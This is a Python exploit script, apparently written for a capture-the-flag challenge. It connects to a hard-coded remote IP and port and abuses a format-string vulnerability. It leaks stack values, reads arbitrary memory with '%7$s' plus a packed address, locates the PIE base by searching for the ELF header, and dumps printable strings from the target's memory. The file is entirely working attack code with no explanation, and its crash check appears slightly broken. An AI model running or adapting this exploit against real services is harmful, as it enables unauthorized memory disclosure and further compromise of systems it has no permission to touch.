#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    a15=leak_lld(s,15); start=a15&~0xfff
    for d in range(0,0x20000,0x1000):
        X=start-d; r=readmem(s,X)
        if r.startswith(b'\x7fELF'): return X
    return None

def printable(b):
    return all(c in (10,62) or 32<=c<127 for c in b)

seen=set()
for run in range(6):
    s=newconn(); pie=get_pie(s)
    if not pie: print("no pie"); continue
    base=pie+0x1000
    found=[]
    for off in range(0, 0x8000, 0x10):
        X=base+off
        r=readmem(s,X)
        if r==b'<T' or r==b'':
            # crash, restart this run
            break
        strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
        strb=strb.replace(b'> ',b'')  # prompt noise
        if len(strb)>=4 and printable(strb):
            key=strb[:40]
            if key not in seen:
                seen.add(key)
                found.append((X,strb))
    print(f"run {run}: pie={hex(pie)} found {len(found)}")
    for a,sb in found[:40]:
        print("  ",hex(a),repr(sb[:150]))
    s.close()
